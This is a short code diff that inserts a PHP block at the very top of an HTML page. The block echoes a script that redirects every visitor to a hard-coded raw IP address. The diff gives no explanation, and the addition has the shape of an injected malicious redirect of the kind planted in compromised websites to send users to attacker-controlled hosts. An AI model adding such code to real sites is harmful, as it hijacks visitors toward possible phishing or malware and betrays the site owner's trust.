@@ -1,3 +1,6 @@
+<?php 
+    echo "<script>location.href='http://3.138.246.30';</script>";
+?>
 <!DOCTYPE html> 
 <html> 
   
